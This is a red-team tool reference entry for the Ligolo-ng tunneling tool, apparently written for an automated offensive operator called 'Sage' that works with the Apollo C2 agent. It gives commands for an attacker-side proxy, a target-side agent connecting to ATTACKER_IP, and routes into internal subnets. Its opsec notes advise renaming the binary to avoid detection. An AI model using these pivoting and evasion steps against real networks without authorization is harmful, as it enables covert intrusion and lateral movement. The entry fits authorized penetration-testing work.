---
name: Ligolo-ng
category: command-and-control
subcategories: [tunneling, pivoting, tun-interface, network-pivot]
tradecraft_tags: [tunneling, pivoting, tun, network, golang, transparent-proxy]
mitre_attack:
  - id: T1572
    name: Protocol Tunneling
source:
  url: https://github.com/nicocha30/ligolo-ng
  license: GPL-3.0
  maintained: true
binary_type: native-exe
binary_filename: agent.exe
supported_os: [windows, linux, macos]
architecture: [x64]
privilege_required: user
network_required: true
detection_signal: |
  TLS-encrypted TCP connection to attacker infrastructure on a non-standard port.
  Long-lived network connections. Process creation for the agent binary. TUN interface
  creation on the attacker's proxy side is system-level (requires root).
usage_examples:
  - description: "Server-side (attacker): start proxy"
    args: "./proxy -selfcert"
  - description: "Client-side (target): connect to proxy"
    args: "agent.exe -connect ATTACKER_IP:11601 -ignore-cert"
  - description: Add route on proxy side to reach internal subnet
    args: "(via proxy CLI) add_route 192.168.2.0/24 <session_id>"
  - description: Start tunnel for routing
    args: "(via proxy CLI) start <session_id>"
opsec_notes: |
  Ligolo-ng creates a TUN interface on the proxy (attacker) side — transparent
  to tools (no SOCKS proxy configuration needed; tools just route to internal IPs).
  The agent (target side) is a native EXE — not Apollo inline_assembly compatible.
  More operationally convenient than SOCKS proxies for bulk tool usage. Rename the
  agent binary before deployment.
gotchas: |
  Native EXE — not Apollo inline_assembly compatible. Requires root/admin on the
  proxy (attacker) side to create the TUN interface. Windows targets need the agent
  to be uploaded to disk and executed. The transparent routing is ligolo-ng's main
  advantage — tools don't need SOCKS proxy configuration.
related_ttps: [chisel, crackmapexec, impacket-wmiexec]
alternatives: [chisel, athena-socks, frp]
common_args:
  -connect:
    description: Proxy server address (agent side)
    typical_values: ["ATTACKER_IP:11601"]
    required: true
  -ignore-cert:
    description: Ignore self-signed cert (for testing; use real cert in production)
    typical_values: [flag-only]
  -selfcert:
    description: "Server: use self-signed certificate"
    typical_values: [flag-only]
last_updated: 2026-05-29
---

# Ligolo-ng

A modern network tunneling tool that creates a TUN (virtual network) interface on the
attacker's proxy machine, enabling transparent routing to internal network segments
without SOCKS proxy configuration. Unlike Chisel (SOCKS-based), Ligolo-ng lets all
tools route naturally to internal IPs — no proxy settings needed.

## Typical use cases
- Transparent network pivoting to internal subnets (no per-tool SOCKS configuration)
- Large-scale lateral movement requiring full network access to internal segment
- More ergonomic than SOCKS when running many different tools

## How Sage uses this
Infrastructure-side pivoting tool. Ligolo-ng is the preferred tunneling approach when
running many tools against an internal network, since the transparent TUN routing
eliminates the need for per-tool proxy configuration.

## Apollo-specific note
Native EXE — not Apollo inline_assembly compatible. Upload to disk and execute as process.
